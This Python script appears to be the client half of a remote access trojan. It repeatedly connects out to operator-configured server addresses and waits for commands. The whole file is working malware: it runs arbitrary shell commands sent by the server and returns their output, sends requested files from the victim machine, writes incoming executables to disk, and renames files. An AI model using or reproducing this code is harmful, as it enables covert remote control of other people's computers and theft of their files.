import socket
import os
import sys
import subprocess
import time
import pynput
from shutil import copyfile

host_list = [""] # Enter your potential server public IPV4 addresses for client conn
port = 0 # Enter the port that will be used to communicate to the server
debug = False

def debug(statement):
    if debug == True:
        print(statement)
    else:
        pass


def find_connection():
    global s

    print("\nSearching for connection")
    while True:
        try:
            while True:
                for host in host_list:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host, port))
                        break
                    except:
                        continue

                s.send(str.encode(" "))
                break

            print("Connection Found\n")
            break

        except:
            continue


find_connection()

while True:
    try:
        s.send(str.encode(" "))
        data = s.recv(40960)
        try:
            data = data.decode("utf-8")
        except:
            try: # Copies the bytes from file transfer as it comes through
                file = open(f"{os.getcwd()}/temporary.exe", "wb")
                file_data = s.recv(81920000)
                file.write(data + file_data)
                file.close()
                continue
            except:
                pass

        if data == "cd":
            os.chdir(os.path.expanduser("/"))
            s.send(str.encode(os.getcwd()))

        elif data == "cd ~":
            os.chdir(os.path.expanduser("~"))
            s.send(str.encode(os.getcwd()))

        elif "cd " in data:
            data = data.replace("cd ", "")
            os.chdir(os.path.expanduser(data))
            s.send(str.encode(os.getcwd()))

        elif "file transfer " in data: #Responsible for checking if filepath is clear
            data = data.replace("file transfer ", f"{os.getcwd()}/")
            if os.path.exists(os.path.expanduser(f"{os.getcwd()}/{data}")):
                os.remove(os.path.expanduser(f"{os.getcwd()}/{data}"))

        elif "file collect " in data:
            data = data.replace("file collect ", "")
            file = open(data, "rb")
            file_data = file.read()
            s.send(file_data)
            file.close()

        elif "rename " in data:
            data = data.replace("rename ", f"{os.getcwd()}/")
            data = list(data)
            for i in range(len(data)):
                char = data[i]
                if char == ",":
                    src = data[:i]
                    src = "".join(src)
                    dest = data[i+1:]
                    dest = "".join(dest)
            os.rename(f"{src}", f"{dest}")

        elif len(data) > 0:
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + " "))
            s.send(str.encode(" "))
    except:
        s.close()
        print("Processes Terminated")
        find_connection()
